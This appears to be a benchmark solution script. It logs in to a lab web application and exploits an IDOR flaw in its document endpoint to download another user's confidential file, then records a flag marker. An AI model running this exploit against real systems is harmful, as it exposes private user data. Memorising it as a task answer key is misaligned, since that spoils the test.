#!/bin/bash
set -u
BASE="${TARGET:-http://web:8080}"; OUT="/logs/verifier"; mkdir -p "$OUT"; J=/tmp/cj.txt
C="$(curl -s --max-time 20 "$BASE/api/credentials")"
U="$(printf '%s' "$C" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("username",""))')"
P="$(printf '%s' "$C" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("password",""))')"
VID="$(printf '%s' "$C" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("victim_user_id",""))')"
# login
LTOK="$(curl -s -c "$J" "$BASE/index.php" | grep -oE 'name="token" value="[^"]+"' | head -1 | sed -E 's/.*value="([^"]+)".*/\1/')"
curl -s -b "$J" -c "$J" "$BASE/index.php" --data-urlencode "token=$LTOK"   --data "actionlogin=login&loginfunction=loginfunction"   --data-urlencode "username=$U" --data-urlencode "password=$P" -o /dev/null
# IDOR: download the victim's private document by their user id
RESP="$(curl -s -b "$J" --max-time 30 "$BASE/document.php?modulepart=user&entity=1&file=$VID/offer-letter-confidential.pdf")"
MARKER="$(printf '%s' "$RESP" | grep -oE '[a-f0-9]{48}' | head -1)"
printf '%s' "$MARKER" > "$OUT/submission.txt"
echo "recovered marker: $MARKER"
